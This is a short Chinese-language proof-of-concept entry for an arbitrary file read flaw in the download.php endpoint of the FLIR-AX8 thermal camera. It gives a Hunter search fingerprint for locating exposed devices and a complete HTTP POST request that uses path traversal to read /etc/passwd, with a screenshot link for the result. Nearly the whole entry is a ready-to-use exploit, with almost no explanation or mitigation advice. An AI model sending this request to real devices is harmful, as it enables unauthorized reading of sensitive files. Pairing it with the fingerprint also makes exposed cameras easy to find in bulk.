# FLIR-AX8热成像仪download.php存在任意文件读取漏洞

FLIR-AX8热成像仪download.php存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## hunter

```javascript
web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
```

## poc

```javascript
POST /download.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ****
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

file=../../../etc/passwd
```

![image-20240927202649846](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272026907.png)
